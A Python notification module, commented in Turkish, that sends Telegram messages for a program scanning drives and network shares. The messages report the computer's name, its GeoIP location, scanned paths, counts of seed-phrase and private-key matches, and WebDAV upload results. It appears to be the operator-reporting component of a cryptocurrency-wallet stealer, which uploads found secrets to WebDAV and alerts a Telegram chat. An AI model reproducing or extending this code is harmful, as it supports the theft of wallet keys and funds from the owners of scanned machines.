"""Telegram notifications."""

import datetime
import html
import os
import socket
import time

import requests

from .config import (
    TELEGRAM_ENABLED, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
    TELEGRAM_TIMEOUT, TELEGRAM_MAX_RETRY, TELEGRAM_RETRY_DELAY,
    WEBDAV_ENABLED,
)
from .geoip import get_geoip_info

def _telegram_api_url(method: str) -> str:
    """Telegram Bot API endpoint URL'sini döndürür."""
    return f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"


def _telegram_html(value) -> str:
    """Telegram HTML mesajındaki dinamik bir değeri güvenle kaçışlar."""
    return html.escape(str(value), quote=True)


def send_telegram(text: str, silent: bool = False) -> bool:
    """
    Telegram botuna HTML formatında mesaj gönderir.

    Parametreler
    ------------
    text   : Gönderilecek mesaj (HTML etiketleri desteklenir:
             <b>, <i>, <code>, <pre>, <a href="...">).
             Telegram sınırı: 4096 karakter — uzun mesajlar otomatik kırpılır.
    silent : True → bildirim sesi/titreşim olmadan (sessiz bildirim).

    Dönüş
    -----
    True  → mesaj başarıyla iletildi
    False → TELEGRAM_ENABLED kapalı, kimlik bilgileri eksik veya gönderim hatası

    Davranış
    --------
    - TELEGRAM_ENABLED False ise hiçbir şey yapmaz, sessizce True döner.
    - Geçici ağ hatalarında (bağlantı kopukluğu, 5xx) TELEGRAM_MAX_RETRY
      kadar üstel geri-çekilme (exponential backoff) ile yeniden dener.
    - 401 / 400 gibi kalıcı hatalar anında durdurulur, retry yapılmaz.
    - Herhangi bir istisna ana programı asla çökertmez; hata konsola yazılır.
    """
    if not TELEGRAM_ENABLED:
        return True

    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False

    # 4096 karakter sınırını aş; kırpıldığını belli et
    MAX_LEN = 4096
    if len(text) > MAX_LEN:
        text = text[: MAX_LEN - 30] + "\n\n<i>... (mesaj kırpıldı)</i>"

    payload = {
        "chat_id"              : TELEGRAM_CHAT_ID,
        "text"                 : text,
        "parse_mode"           : "HTML",
        "disable_notification" : silent,
    }

    url = _telegram_api_url("sendMessage")

    for attempt in range(1, TELEGRAM_MAX_RETRY + 1):
        try:
            response = requests.post(url, json=payload, timeout=TELEGRAM_TIMEOUT)

            # Kalıcı hata → retry anlamsız
            if response.status_code in (400, 401, 403, 404):
                try:
                    desc = response.json().get("description", "bilinmiyor")
                except Exception:
                    desc = "bilinmiyor"
                return False

            # Başarı
            if response.status_code == 200:
                return True

            # 5xx veya beklenmedik kod → retry

        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
        except Exception as exc:
            return False

        if attempt < TELEGRAM_MAX_RETRY:
            time.sleep(2 ** attempt * TELEGRAM_RETRY_DELAY)   # 2s → 4s → 8s

    return False


def telegram_test() -> bool:
    """
    Telegram bot token ve chat ID ayarlarının geçerli olup olmadığını
    sessizce doğrular. getMe API uç noktasına istek atarak token'ın
    geçerli olduğunu kontrol eder — kullanıcıya hiçbir mesaj GÖNDERİLMEZ.

    Gerçek tarama başlangıç bildirimi telegram_notify_scan_started()
    tarafından ayrıca gönderilir; bu fonksiyon sadece bağlantı/token
    kontrolü yapar.

    TELEGRAM_ENABLED False ise sessizce True döner.
    """
    if not TELEGRAM_ENABLED:
        return True

    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False

    try:
        url = _telegram_api_url("getMe")
        response = requests.get(url, timeout=TELEGRAM_TIMEOUT)
        if response.status_code == 200 and response.json().get("ok"):
            return True
        elif response.status_code == 401:
            return False
        else:
            return False
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    except Exception as exc:
        return False


def telegram_notify_scan_started(scan_paths: list) -> None:
    """
    Tarama başlangıç bildirimini Telegram'a gönderir.

    Mesaj içeriği:
      - Bilgisayar adı
      - Ülke ve şehir (GeoIP — get_geoip_info() önbelleği kullanılır,
        ekstra API çağrısı yapılmaz)
      - Başlangıç tarihi/saati
      - Sürücüler ve ağ konumları ayrı ayrı listelenir

    scan_paths: main() içinde belirlenen Path nesneleri listesi.
    """
    if not TELEGRAM_ENABLED:
        return


    # --- Kimlik bilgileri ---
    pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "UnknownPC"
    geo     = get_geoip_info()          # önbellekten gelir, API vurmaz
    country = geo.get("country", "Unknown")
    city    = geo.get("city",    "Unknown")
    now     = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

    # --- Sürücü ve ağ konumlarını ayır ---
    drives   = []
    networks = []
    for p in scan_paths:
        s = str(p)
        if s.startswith("\\"):        # UNC ağ konumu: \sunucu\paylasim
            networks.append(s)
        else:
            drives.append(s)            # yerel/harici sürücü: C:\, D:\, ...

    # --- Mesaj satırlarını oluştur ---
    lines = [
        "🚀 <b>Tarama Başladı</b>",
        "",
        f"🖥️  <b>Bilgisayar :</b> <code>{_telegram_html(pc_name)}</code>",
        f"🌍  <b>Konum      :</b> {_telegram_html(country)} / {_telegram_html(city)}",
        f"🕐  <b>Başlangıç :</b> {_telegram_html(now)}",
        "",
    ]

    if drives:
        lines.append(f"💾 <b>Sürücüler ({len(drives)}):</b>")
        for d in drives:
            lines.append(f"   • <code>{_telegram_html(d)}</code>")

    if networks:
        lines.append("")
        lines.append(f"🌐 <b>Ağ Konumları ({len(networks)}):</b>")
        for n in networks:
            lines.append(f"   • <code>{_telegram_html(n)}</code>")

    if not drives and not networks:
        lines.append("⚠️ Taranacak konum bulunamadı.")

    send_telegram("\n".join(lines))


def telegram_notify_scan_completed(
    results: list,
    key_results: list,
    scanned_count: int,
    elapsed_seconds: float,
    upload_stats: dict,
) -> None:
    """
    Tarama tamamlandi bildirimi.

    Parametreler
    ------------
    results         : run_scan() seed phrase sonuclari listesi
    key_results     : run_scan() private key sonuclari listesi
    scanned_count   : taranan toplam dosya sayisi
    elapsed_seconds : tarama suresi (saniye, main() icinde olculur)
    upload_stats    : bu taramada gerceklesen WebDAV sonuc sayilari
    """
    if not TELEGRAM_ENABLED:
        return

    pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "UnknownPC"

    if elapsed_seconds >= 3600:
        sure_str = f"{elapsed_seconds / 3600:.1f} saat"
    elif elapsed_seconds >= 60:
        sure_str = f"{elapsed_seconds / 60:.1f} dakika"
    else:
        sure_str = f"{elapsed_seconds:.1f} saniye"

    # Telegram raporunda yalnızca aksiyon gerektiren sonuçları göster.
    # ORTA/DÜŞÜK sinyaller konsol raporunda kalır; Telegram'ı kalabalıklaştırmaz.
    critical_seeds = [r for r in results if r.get("confidence") == "ÇOK YÜKSEK"]
    critical_keys = [r for r in key_results if r.get("confidence") == "ÇOK YÜKSEK"]
    critical_files = {
        r.get("source") for r in critical_seeds + critical_keys if r.get("source")
    }

    # Eşleşme sayısını değil, WebDAV'ın gerçek sonucunu göster. Aynı içerik
    # hash'i daha önce yüklenmişse "skipped", ağ/HTTP hatası varsa "failed"
    # sayılır ve bunlar başarılı yükleme toplamına dahil edilmez.
    upload_count = upload_stats.get("uploaded", 0)
    upload_skipped = upload_stats.get("skipped", 0)
    upload_failed = upload_stats.get("failed", 0)

    lines = [
        "✅ <b>Tarama Tamamlandı</b>",
        f"🖥️ <code>{_telegram_html(pc_name)}</code>",
        (f"⏱️ {_telegram_html(sure_str)}  •  "
         f"📂 {scanned_count:,} dosya".replace(",", ".")),
    ]

    if WEBDAV_ENABLED:
        lines.append(f"📤 <b>Yeni:</b> {upload_count}  •  "
                     f"⏭️ <b>Önceden yüklü:</b> {upload_skipped}")
        if upload_failed:
            lines.append(f"❌ <b>Yüklenemeyen:</b> {upload_failed}")

    lines.append("")
    if critical_files:
        lines.append(f"🚨 <b>Kritik bulgu:</b> {len(critical_files)} dosya")
        if critical_seeds:
            lines.append(f"🌱 Seed phrase: <b>{len(critical_seeds)}</b> eşleşme")
        if critical_keys:
            type_counts = {}
            for result in critical_keys:
                key_type = result.get("type", "Private key")
                type_counts[key_type] = type_counts.get(key_type, 0) + 1
            type_summary = ", ".join(
                f"{_telegram_html(key_type)} ×{count}"
                for key_type, count in type_counts.items()
            )
            lines.append(f"🔑 Private key: <b>{len(critical_keys)}</b> "
                         f"eşleşme ({type_summary})")
    else:
        lines.append("🟢 <b>Kritik bulgu yok</b>")

    send_telegram("\n".join(lines))


# Aynı WebDAV hata türü oturumda yalnızca bir kez bildirilir (flood engeli).
_WEBDAV_NOTIFIED_ERRORS: set = set()


def telegram_notify_webdav_error(
    title: str,
    detail: str,
    filename: str = None,
) -> None:
    """
    WebDAV hata bildirimini Telegram\'a g\u00f6nderir.

    Parametreler
    ------------
    title    : K\u0131sa hata ba\u015fl\u0131\u011f\u0131 — flood tespiti i\u00e7in anahtar olarak da kullan\u0131l\u0131r.
    detail   : Detayl\u0131 hata mesaj\u0131 veya URL.
    filename : Hatal\u0131 dosya ad\u0131 (upload hatas\u0131ysa); ba\u011flant\u0131 testi i\u00e7in None.

    Flood engeli
    ------------
    Ayn\u0131 title oturumda ikinci kez gelirse bildirim g\u00f6nderilmez.
    B\u00f6ylece onlarca dosyan\u0131n upload\u0131 ba\u015far\u0131s\u0131z olsa bile
    Telegram \'a yaln\u0131zca tek mesaj d\u00fc\u015fer.
    """
    if not TELEGRAM_ENABLED:
        return

    global _WEBDAV_NOTIFIED_ERRORS
    if title in _WEBDAV_NOTIFIED_ERRORS:
        return
    _WEBDAV_NOTIFIED_ERRORS.add(title)


    pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "UnknownPC"
    now     = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

    lines = [
        "\U0001f534 <b>WebDAV Hatas\u0131</b>",
        "",
        f"\U0001f5a5\ufe0f  <b>Bilgisayar :</b> <code>{_telegram_html(pc_name)}</code>",
        f"\U0001f550  <b>Zaman      :</b> {_telegram_html(now)}",
        f"\u26a0\ufe0f  <b>Hata       :</b> <b>{_telegram_html(title)}</b>",
        f"\U0001f4cb  <b>Detay      :</b> <code>{_telegram_html(detail)}</code>",
    ]

    if filename:
        lines.append(
            f"\U0001f4c4  <b>Dosya      :</b> <code>{_telegram_html(filename)}</code>"
        )

    send_telegram("\n".join(lines))
